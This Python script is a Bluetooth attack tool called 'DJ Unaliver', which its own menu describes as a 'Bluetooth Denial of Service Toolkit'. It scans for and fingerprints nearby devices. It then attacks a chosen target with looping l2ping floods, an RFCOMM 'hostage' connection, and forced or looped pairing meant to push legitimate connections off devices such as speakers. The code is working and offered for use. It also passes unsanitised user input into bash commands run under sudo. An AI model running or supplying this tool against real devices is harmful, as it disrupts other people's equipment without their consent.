import subprocess
import time
import threading
import json
import platform
import requests

# Print Banner

print('  _________________________________________________________________________________')
print(' |................................................................................|')
print(' |................................................................................|')
print(' |....................................................#@..........................|')
print(' |..................................%.....:%%%%.....%%%@..........................|')
print(' |................................#%%%..#%%%%..##%%%%@@:..........................|')
print(' |............................%...%%%%%%%%%%%%%%%%%%%@............................|')
print(' |...........................%%=*%%%%%%%%%%%%%%%%%%@@@@@@.........................|')
print(' |..........................%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@.....................|')
print(' |........................#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.......................|')
print(' |......................@.%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@.....................|')
print(' |.....................@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@:...................|')
print(' |....................@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@..................|')
print(' |....................@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@..................|')
print(' |...................@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@.................|')
print(' |...................@%%%%%%%:::::::::%%%%%%%%%-::::::::#%%%%%%%@.................|')
print(' |...................@%%%%%%::::::::::::%%%%%%::::::::::::%%%%%%@.................|')
print(' |...................@%%%%%::::::::::::::+%%::::::::::::::-%%%%%@.................|')
print(' |.............::::::@@%%%=::%%%%%%%%%%:::::::-%%%%%%%%%-::%%%%@#:::::............|')
print(' |............-::+##::=@%%+@@@..@@@@..*@@::::@@..%@@@+..@@#%%%@:::##:::-..........|')
print(' |............::#####:-@@%@@@#....*....@@@@@@@%....#....@@@@%@@:*#####::..........|')
print(' |...........-:##====*:@@%@@@@@:.....@@@@@@@@@@@%.....%@@@@@%@@:=====#::-.........|')
print(' |...........-:#====###@@%@@@@@.......@@@@@@@@@@.......@@@@@%@@###====::-.........|')
print(' |............::===#+**#@%@@@....=@....#@@@@@@.....@....:@@%%@***+#===::..........|')
print(' |............-::====***#@%@@@+.@@@@%.@@@%%@@@@*.@@@@@.%@@@%@****=*==::-..........|')
print(' |.............-::==-=**#@%%-@@@@@@@@@:::---::::@@@@@@@@++%%@***=-==::=...........|')
print(' |...............+:::::::@%%%%:=-=-==:+@@:.:%@@-:==--=-:%%%%@::::::-+.............|')
print(' |.................+++++@@%%%%%%%%%:::==@@::@@=-::-%%%%%%%%%@%+++++...............|')
print(' |.....................@%%%%%%%%%#::::::::::::::::::%%%%%%%%%@@...................|')
print(' |....................@@%%%%%%%%#::::::::::::::::::::%%%%%%%%@@...................|')
print(' |....................@@@%%%%%%%::::::::::::::::::::::%%%%%%%@@...................|')
print(' |....................@@.@%%%%%%-@::::::::::::::::::%=%%%%%@@%@...................|')
print(' |........................@@@%%%=:=::**-::::::***:-=:=%%%@@*......................|')
print(' |........................@@@@@%#=::-=+::::::::++:::=%%@@@@@......................|')
print(' |.....................:#%@@@@@@@%==::::::::::::::==%@@@@@@@%*....................|')
print(' |.....................%%%%%%@@@@@@@++=-------==++@@@@%@%%%%%%@...................|')
print(' |..................#####@%%*##%@@@@@@@@@@@@@@@@@@@@@@%##*%%@#####................|')
print(' |...............%#######%@@%%*%@@@@@@@@@@@@@@@@@@@@@%%*%%@@%########.............|')
print(' |..............%@%#######%%%%%#%%@@@@@@LOGGER@@@@@@@%%#%%@@########%@*...........|')
print(' |............%%%%%%#######%%@%%##%%@@@@@@@@@@@@@@%%##%%@%%#######@%%%%#..........|')
print(' |...........=%%%%%%@########%%%@%%##%%%@@@@@@%%%**%%@%%%########@%%%%%%-.........|')
print(' |..........%%%%%%%%@%########%%%%@@@%%#*%%%%*#%%@@@%%%%########%@%%%%%%%%........|')
print(' |.........%%%%%%%%%%%%##########%%%%%%@@%%%%@@%%%%%%##########%%%%%%%%%%%%.......|')
print(' |........%%%%%%%%%%@@%##############%%%%%@@%%%%%##############%@@%%%%%%%%%%......|')
print(' |.......%%%%%%%%%%@@@%###################@@###################%@@@%%%%%%%%%#.....|')
print(' |........%%%%%%%%%@@@%%##################%@##################%@@@@%%%%%%%%%......|')
print(' |...........%%%%%@@@@%%%%################@@################%%%@@@@@%%%%%.........|')
print(' |..............@@@@@@%%%%################@@###############%%%%@@@@@@@............|')
print(' |..................:.%%%%%%##############%@##############%%%%%@..................|')
print(' |......................%%%%%#############@@############%%%%%%....................|')
print(' |............................%%%#########@@#########%%%..........................|')
print(' |..................................::::::::::::::................................|')
print(' |...........░: |            D J         -V1-     U N A L I V E R      | : .......|')
print(' |................................................................................|')
print(' |--------------..----- Based on Party Pooper by Edgar Medina  -------------------|')
print(' |-------------------------------- Author: Logger --------------------------------|')
print(' |--------------------------------------------------------------------------------|')
print(' |--------------For legal purposes, no code was reused from Party Pooper----------|')
print(' |--------------------------------------------------------------------------------|')
print(' |--------------------------------------------------------------------------------|')
print('  ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯ ')
print('')

# OS Chec
def start_bluetooth():
    system = platform.system()

    if system == "Linux":
        cmd = ["sudo", "service", "bluetooth", "start"]
    elif system == "Darwin":  # macOS
        cmd = ["sudo", "launchctl", "load", "/System/Library/LaunchDaemons/com.apple.blued.plist"]
        print(" This software is not built for MAC, only Linux")
    elif system == "Windows":
        print(" This software is not built for Windows, only Linux")
        return
    else:
        print(" Unsupported OS.")
        return

    try:
        subprocess.run(cmd, check=True)
        print(" Bluetooth service started successfully.")
    except subprocess.CalledProcessError:
        print(" Failed to start Bluetooth. Try enabling it manually.")

# 🔹 **Run this automatically when the script starts**
if __name__ == "__main__":
    start_bluetooth()
    print(" App started successfully!")
# Start Bluetooth service if not already started
subprocess.run(['sudo', 'service', 'bluetooth', 'start'], check=True)

def scan():
    # Launch xterm window and run hcitool scan inside it
    subprocess.run(['xterm', '-xrm', 'XTerm*selectToClipboard: true', '-hold',  '-e', 'bash -c "timeout 30s bluetoothctl scan on; echo Scan Completed!"'], check=True)

def info():
    #Device info
    addr = input(" Enter Bluetooth Device MAC Address: ")
    try:
        result = subprocess.run(['bluetoothctl', 'info', addr], capture_output=True, text=True, check=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f" Failed to get device info: {e}")

def info2():
    addr = input(" Enter Bluetooth Device MAC Address: ")
    try:
        subprocess.run(['xterm', '-hold', '-e', f'bluetoothctl info {addr}'], check=True)
    except subprocess.CalledProcessError as e:
        print(f" Failed to get device info: {e}")

def check_mac_info():
    addr = input(" Enter Bluetooth Device MAC Address: ")

    # User selects API source
    print(" Choose a lookup service:")
    print(" 1. macvendors.com")
    print(" 2. maclookup.app")
    choice = input("Enter your choice (1 or 2): ")

    if choice == "1":
        url = f"https://api.macvendors.com/{addr}"
        use_json = False # macvendors returns plain text

    elif choice == "2":
        url = f"https://api.maclookup.app/v2/macs/{addr}"
        use_json = True # maclookup.app returns JSON

    else:
        print("Invalid choice. Defaulting to maclookup.app")
        url = f"https://api.maclookup.app/v2/macs/{addr}"
        use_json = True

    try:
        # Run curl to fetch MAC address details
        result = subprocess.run(
            ["curl", "-s", url], capture_output=True, text=True, check=True
        )

        if use_json:
            # Parse the JSON response from macklookup.app
            data = json.loads(result.stdout)

            if "company" in data:
                print("\n🔍 **MAC Address Information** 🔍")
                print("----------------------------------")
                print(f"✅ Found: {'Yes' if data.get('found', False) else 'No'}")
                print(f"🏢 Manufacturer: {data.get('company', 'Unknown')}")
                print(f"📍 Address: {data.get('address', 'Unknown')}")
                print(f"🌍 Country: {data.get('country', 'Unknown')}")
                print(f"📡 MAC Prefix: {data.get('macPrefix', 'Unknown')}")
                print(f"📌 Block Type: {data.get('blockType', 'Unknown')}")
                print(f"📅 Last Updated: {data.get('updated', 'Unknown')}")
                print(f"🔢 Block Range: {data.get('blockStart', 'Unknown')} → {data.get('blockEnd', 'Unknown')}")
                print(f"📦 Block Size: {data.get('blockSize', 'Unknown'):,}")
                print(f"🔀 Randomized: {'Yes' if data.get('isRand', False) else 'No'}")
                print(f"🔒 Private Use: {'Yes' if data.get('isPrivate', False) else 'No'}")
                print("----------------------------------\n")
            else:
                print(" MAC address not found in database")
        else:
            # macvendors.com returns plain text with just the manufacturer's name
            if result.stdout.strip():
                print(f" Device Manufacturer: {result.stdout.strip()}")
            else:
                print(" MAC address not found in database.")

    except subprocess.CalledProcessError as e:
        print(f" Error fetching MAC details: {e}")
    except json.JSONDecodeError:
        print(" Invalid response received. API might be down.")

def l2ping():
    # Launch xterm window and run l2ping command inside it
    addr = input(" Enter Bluetooth Device MAC Address: ")
    pack = input(" Enter Packet Size: (600 MIGHT work on older devices, less than 40 to check connection \n Newer speakers may not receive larger size packets) ")
    try:
        #open xterm and run the loop inside it
        subprocess.run(['xterm','-hold', '-e', f'bash -c "while true;  do sudo l2ping -c 1 -s {pack} {addr}; sleep 1; done"'], check=False)
    except subprocess.CalledProcessError as e:
        print(f" Error sending packets to: {e}")


def hostage():
    #Connect forcibly to the device
    addr = input(" Enter Bluetooth Device MAC Address: ")

    
    try:
        print(f" Attempting to force an RFCOMM connection to {addr}")

        # Run the rfcomm command in a separate termina (xterm) and attempts to connect
        subprocess.run([
            'xterm', '-hold', '-e', f'bash -c \"while true; do sudo rfcomm connect hci0 {addr};'
            f'echo Connection lost. Press Enter to retry...; read; done\"'], check=False)

    except subprocess.CalledProcessError as e:
        print(f" Error forcing RFCOMM connection: {e}")


def forcePair():
    #force all connected devices to disconnect
    addr = input(" Enter Bluetooth Device MAC Address: ")

    try:
        #Try to pair (might fail if already paired)
        subprocess.run(['bluetoothctl', 'pair', addr], check=False)
        #Try to connect (This may force the other connections off)
        subprocess.run(['bluetoothctl', 'connect', addr], check=False)
        print(f" Attempting to force a connection to {addr}...")
    except subprocess.CalledProcessError as e:
        print(f" Failed to force device: {e}")

def forcedConnect():
    #Loop force connection
    addr = input(" Enter Bluetooth Device MAC Address: ")
    duration = input(" Enter a quantity of time, in seconds. (Or press enter to run indefinitely): ")

    if duration.isdigit():
        duration = int(duration)
        print(f" Attempting to connect to {addr} for {duration} seconds...")
        start_time = time.time()

        while time.time() - start_time < duration:
            subprocess.run(['bluetoothctl', 'connect', addr], check=False)
            time.sleep(1)

        print(" Connection attempts stopped.")

    else:
        print(f" Attempting to connect to {addr} indefinitely... CTRL + C or Enter to stop.")

        # Run the connection loop in a separate thread
        stop_flag = threading.Event()

        def connect_loop():
            while not stop_flag.is_set():
                subprocess.run(['bluetoothctl', 'connect', addr], check=False)
                time.sleep(1)

        thread = threading.Thread(target=connect_loop, daemon=True)
        thread.start()

        # Wait for the user to press Enter
        input()
        stop_flag.set()
        print(" Connection loop stopped.")

def forcedConnectXterm():
    # Get user input
    addr = input(" Enter Bluetooth Device MAC Address: ")
    duration = input(" Enter a quantity of time, in seconds (or press enter to run indefinitely): ")

    if duration.isdigit():
        duration = int(duration)
        print(f" Attempting to connect to {addr} for {duration} seconds...")

        # Properly formatted Bash script in subprocess
        subprocess.Popen([
            'xterm', '-hold', '-e',
            f'bash -c \'end=$(( $(date +%s) + {duration} )); '
            f'while [ "$(date +%s)" -lt "$end" ]; do '
            f'bluetoothctl connect {addr}; sleep 1; done; '
            f'echo "Connection ended"; sleep 2\''
        ]).wait()  # Wait for xterm to close

        print(" Connection attempts stopped.")

    else:
        print(f" Attempting to connect to {addr} indefinitely... Press Enter in xterm to stop.")

        # Run xterm in an infinite loop
        subprocess.Popen([
            'xterm', '-hold', '-e',
            f'bash -c \'while true; do bluetoothctl connect {addr}; sleep 1; done\''
        ])
            

# Main program loop
while True:
    # Display menu options
    print(" =============================== *** DJ Unaliver *** ==============================")
    print(" ==================================================================================")
    print(" ======================    Bluetooth Denial of Service Toolkit   ==================")
    print(" ==================================================================================")
    print(" ======================== 1. Scan for nearby devices            ===================")
    print(" ======================== 2. Lookup MAC address info            ===================")
    print(" ======================== 3. Info on selected device            ===================")
    print(" ======================== 4. Info on selected device (xterm)    ===================")
    print(" ======================== 5. L2Ping of Death (Check Connection) ===================")
    print(" ======================== 6. RFCOMM Hostage Connection          ===================")
    print(" ======================== 7. Forced Pairing                     ===================")
    print(" ======================== 8. Forced Looped Pairing              ===================")
    print(" ======================== 9. Forced Looped Pairing (xterm)      ===================")
    print(" ======================== 0. Quit                               ===================")
    print(" ==================================================================================")
    # Get user input
    choice = input(" Enter an option: ")

    # Execute chosen option
    if choice == '1':
        scan()
    elif choice == '2':
        check_mac_info()
    elif choice == '3':
        info()
    elif choice == '4':
        info2()
    elif choice == '5':
        l2ping()
    elif choice == '6':
        hostage()
    elif choice == '7':
        forcePair()
    elif choice == '8':
        forcedConnect()
    elif choice == '9':
        forcedConnectXterm()
    elif choice == '0':
        break
    else:
        print(  " Invalid option. Please try again.")
